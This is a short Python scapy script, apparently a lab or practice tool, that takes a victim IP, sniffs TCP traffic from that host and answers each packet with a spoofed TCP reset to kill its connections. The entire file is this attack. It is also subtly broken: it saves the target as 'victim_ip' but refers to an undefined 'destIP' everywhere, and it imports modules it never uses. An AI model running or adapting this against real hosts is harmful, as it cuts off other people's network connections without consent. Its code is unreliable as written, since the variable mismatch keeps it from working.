#!/usr/bin/python3

#running command: python Sniffer.py victimIP

import sys  #for command line argument
import time
import os
import shutil
import tempfile
from random import randint
from scapy.all import *
from scapy.layers.inet import *
import scapy

victim_ip = sys.argv[1]



def spoof_tcp(pkt):
    IPLayer = IP(dst=destIP, src=pkt[IP].dst)
    TCPLayer = TCP(flags="R", seq=pkt[TCP].ack, dport=pkt[TCP].sport, sport=pkt[TCP].dport)
    spoofpkt = IPLayer/TCPLayer
    send(spoofpkt, verbose=1)
    print("Spoofed Packet Sent...")

while 1 > 0:
    pkt = sniff(filter="tcp and src host " + destIP, prn=spoof_tcp)

    # print("Found Packet")
    # print(pkt)

    # spoof_tcp(pkt)

